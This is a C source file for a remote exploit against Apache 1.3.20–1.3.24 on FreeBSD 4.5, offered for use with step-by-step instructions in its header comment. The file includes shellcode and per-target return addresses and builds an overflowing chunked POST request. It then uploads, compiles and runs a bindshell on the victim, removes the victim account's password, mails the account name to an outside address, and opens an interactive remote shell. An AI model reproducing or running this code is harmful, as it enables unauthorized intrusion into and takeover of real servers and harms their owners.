/**************************************************************************

Freebsd apache exploit inspirated to me by apache-worm.c
published on http://packetstormsecurity.nl.Here is how it
works:
1)Get blackhole.c from packetstorm and set it on port 30464.
 Just change it's default port from the source.
2) Copy it in /tmp/.blackhole.c

 cp blackhole.c /tmp/.blackhole.c

3) Check this source,compile it and run it ./apache-ex <Ip>
If everything works fine you will be connected to a shell on 30464,
then use another exploit to get root.

If you have any flames and comment send them to me at <nebunu@home.ro>
Also check the worm source too.

**************************************************************************/


#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <rpc/rpc.h>
#include <sys/wait.h>
#include <signal.h>

int pizda;
#define ASUCCESS         0
#define HOST_PARAM	"Unknown"
#define RET_ADDR_INC	512
#define PADSIZE_1	4
#define PADSIZE_2 	5
#define PADSIZE_3	7
#define REP_POPULATOR	24
#define REP_SHELLCODE	24
#define NOPCOUNT	1024
#undef NOP
#define NOP		0x41
#define PADDING_1	'A'
#define PADDING_2	'B'
#define PADDING_3	'C'
#define PUT_STRING(s)	memcpy(p, s, strlen(s)); p += strlen(s);
#define PUT_BYTES(n, b)	memset(p, b, n); p += n;
char shellcode[] =
  "\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24"
  "\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31"
  "\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24"
  "\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89"
  "\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89"
  "\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80"
  "\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24"
  "\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0"
  "\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80"
  "\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a"
  "\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50"
  "\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47"
  "\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80"
  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
  "\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc";
;

struct {
char *type;
int delta;
u_long retaddr;
int repretaddr;
int repzero;
} targets[] = {
        { "FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)",      -146,  0xbfbfde00,6, 36 },
        { "FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)",   -134,  0xbfbfdb00,3, 36 },
}, victim;



int conectare(char *ip, int port)
{
struct sockaddr_in addr;
int pizda;
pizda = socket(AF_INET, SOCK_STREAM, 0);
if(pizda == -1)
{
perror("socket()");
exit(-1);
}
addr.sin_addr.s_addr = inet_addr(ip);
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
if(connect(pizda,(struct sockaddr *)&addr,sizeof(struct sockaddr_in)) == -1)
return -1;
return(pizda);
}



void pulamea(int pizda)
{
int             n;
char            recvbuf[1024], *cmd = "id; uname -a\n";
fd_set          rset;
send(pizda, cmd, strlen(cmd), 0);
while (1)
{
FD_ZERO(&rset);
FD_SET(pizda, &rset);
FD_SET(STDIN_FILENO, &rset);
select(pizda+1, &rset, NULL, NULL, NULL);
if(FD_ISSET(pizda, &rset))
{
n = read(pizda, recvbuf, 1024);
if (n <= 0)
{
printf("Connection closed by foreign host!\n");
exit(0);
}
recvbuf[n] = 0;
printf("%s", recvbuf);
}
if (FD_ISSET(STDIN_FILENO, &rset))
{
n = read(STDIN_FILENO, recvbuf, 1024);
if (n > 0)
{
recvbuf[n] = 0;
write(pizda, recvbuf, n);
}
}
}
return;
}







void cleanup(char *buf) 
{
while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
unsigned long i;
for (i=strlen(buf)+1;i>0;i++) buf[i-1]=buf[i];
}
}


char *GetAddress(char *ip) {
struct sockaddr_in sin;
fd_set fds;
int n,d,sock;
char buf[1024];
struct timeval tv;
sock = socket(PF_INET, SOCK_STREAM, 0);
sin.sin_family = PF_INET;
sin.sin_addr.s_addr = inet_addr(ip);
sin.sin_port = htons(80);
if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;
write(sock,"GET / HTTP/1.1\r\n\r\n",strlen("GET / HTTP/1.1\r\n\r\n"));
tv.tv_sec = 15;
tv.tv_usec = 0;
FD_ZERO(&fds);
FD_SET(sock, &fds);
memset(buf, 0, sizeof(buf));
if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
if(FD_ISSET(sock, &fds)) 
{
if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;
for (d=0;d<n;d++) if (!strncmp(buf+d,"Server: ",strlen("Server: "))) {
char *start=buf+d+strlen("Server: ");
for (d=0;d<strlen(start);d++) if (start[d] == '\n') start[d]=0;
cleanup(start);
return strdup(start);
}
}
}
return NULL;
}

#define	ENC(c) ((c) ? ((c) & 077) + ' ': '`')

int sendch(int sock,int buf) {
char a[2];
int b=1;
if (buf == '`' || buf == '\\' || buf == '$') {
a[0]='\\';
a[1]=0;
b=write(sock,a,1);
}
if (b <= 0) return b;
a[0]=buf;
a[1]=0;
return write(sock,a,1);
}

int writem(int sock, char *str) {
return write(sock,str,strlen(str));
}

int encode(int a) {
register int ch, n;
register char *p;
char buf[80];
FILE *in;
if ((in=fopen("/tmp/.blackhole.c","r")) == NULL) return 0;
writem(a,"begin 655 .blackhole.c\n");
while ((n = fread(buf, 1, 45, in))) {
ch = ENC(n);
if (sendch(a,ch) <= ASUCCESS) break;
for (p = buf; n > 0; n -= 3, p += 3) {
if (n < 3) 
{
p[2] = '\0';
if (n < 2) p[1] = '\0';
}
ch = *p >> 2;
ch = ENC(ch);
if (sendch(a,ch) <= ASUCCESS) break;
ch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);
ch = ENC(ch);
if (sendch(a,ch) <= ASUCCESS) break;
ch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);
ch = ENC(ch);
if (sendch(a,ch) <= ASUCCESS) break;
ch = p[2] & 077;
ch = ENC(ch);
if (sendch(a,ch) <= ASUCCESS) break;
}
ch='\n';
if (sendch(a,ch) <= ASUCCESS) break;
usleep(10);
}
if (ferror(in)) {
fclose(in);
return 0;
}
ch = ENC('\0');
sendch(a,ch);
ch = '\n';
sendch(a,ch);
writem(a,"end\n");
if (in) fclose(in);
return 1;
}

void exploit(char *ip) {
char *a=GetAddress(ip);
int l,sock;
struct sockaddr_in sin;
if (a == NULL) exit(0);
if (strncmp(a,"Apache",6)) exit(0);
free(a);
alarm(60);
for (l=0;l<2;l++) {
u_char buf[512], *expbuf=0, *p=0;
int i=0, j=0, responses=0;
memcpy(&victim, &targets[l], sizeof(victim));
sock = socket(PF_INET, SOCK_STREAM, 0);
sin.sin_family = PF_INET;
sin.sin_addr.s_addr = inet_addr(ip);
sin.sin_port = htons(80);
if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) exit(1);
p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE) + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero + 1024) * REP_POPULATOR));
PUT_STRING("POST / HTTP/1.1\r\nHost: " HOST_PARAM "\r\n");
for (i = 0; i < REP_SHELLCODE; i++) {
PUT_STRING("X-");
PUT_BYTES(PADSIZE_3, PADDING_3);
PUT_STRING(": ");
PUT_BYTES(NOPCOUNT, NOP);
memcpy(p, shellcode, sizeof(shellcode) - 1);
p += sizeof(shellcode) - 1;
PUT_STRING("\r\n");
}
for (i = 0; i < REP_POPULATOR; i++) {
PUT_STRING("X-");
PUT_BYTES(PADSIZE_1, PADDING_1);
PUT_STRING(": ");
for (j = 0; j < victim.repretaddr; j++) {
*p++ = victim.retaddr & 0xff;
*p++ = (victim.retaddr >> 8) & 0xff;
*p++ = (victim.retaddr >> 16) & 0xff;
*p++ = (victim.retaddr >> 24) & 0xff;
}
PUT_BYTES(victim.repzero, 0);
PUT_STRING("\r\n");
}
PUT_STRING("Transfer-Encoding: chunked\r\n");
snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", PADSIZE_2);
PUT_STRING(buf);
PUT_BYTES(PADSIZE_2, PADDING_2);
snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", victim.delta);
PUT_STRING(buf);
write(sock, expbuf, p - expbuf);
responses = 0;
while (1) {
fd_set fds;
int n;
struct timeval  tv;
tv.tv_sec = 15;
tv.tv_usec = 0;
FD_ZERO(&fds);
FD_SET(sock, &fds);
memset(buf, 0, sizeof(buf));
if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) if(FD_ISSET(sock, &fds)) {
if((n = read(sock, buf, sizeof(buf) - 1)) < 0) break;
if(n >= 1) 
{
for(i = 0; i < n; i ++) if(buf[i] == 'G') responses ++; else responses = 0;
if(responses >= 2) {
write(sock,"O",1);
alarm(3600);
sleep(10);
writem(sock,"\npasswd -d `whoami`;echo `whoami` | mail email@youraddress.com\n");
writem(sock,"\nrm -rf /tmp/.blackhole.c;cat > /tmp/.uublackhole << __eof__;\n");
encode(sock);
writem(sock,"__eof__\n");
sprintf(buf,"/usr/bin/uudecode -o /tmp/.blackhole.c /tmp/.uublackhole;gcc -o /tmp/.blackhole /tmp/.blackhole.c;chmod +x /tmp/.blackhole;/tmp/.blackhole;exit;\n");
writem(sock,buf);
while(read(sock,buf,1024)>=0);
exit(0);
}
}
}
}
free(expbuf);
close(sock);
}
return;
}


main(int argc,char **argv[])

{
if (argc!=2)
{
printf("AVAILABLE TARGETS:\n
1)   FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)      
2)   FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)


  Adapted after a apache worm by
  nebunu <nebunu@home.ro>
  
  Usage: ./apache-ex <IP>
\n\n");
exit(0);
}
printf("Exploiting %s , nebunu rulez!\n..",argv[1]);
exploit(argv[1]);
sleep(3);
printf("Connecting to shell on port 30464\n...");
pizda=conectare(argv[1],30464);
pulamea(pizda);
}